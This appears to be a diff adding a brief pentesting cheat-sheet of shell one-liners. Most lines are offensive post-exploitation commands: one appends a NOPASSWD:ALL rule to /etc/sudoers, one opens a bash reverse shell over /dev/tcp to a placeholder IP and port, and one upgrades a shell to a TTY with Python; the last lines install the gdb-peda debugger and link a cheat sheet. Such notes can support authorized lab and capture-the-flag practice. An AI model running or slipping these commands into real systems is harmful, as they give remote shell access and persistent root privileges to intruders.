@@ -1,0 +1,15 @@
+***No sudo password for user
+echo “[USER] ALL=(ALL) NOPASSWD:ALL” >> /etc/sudoers
+
+***Bash reverse shell
+bash -i >& /dev/tcp/[IP]:[PORT] 0>&1
+
+***Upgrade shell to tty via Python
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+***Install gdb-peda
+git clone https://github.com/longld/peda ~/peda
+echo "source ~/peda/peda.py" >> ~/.gdbinit
+
+***gdb-peda cheat sheet
+https://github.com/kibercthulhu/gdb-peda-cheatsheet/blob/master/gdb-peda%20cheatsheet.pdf
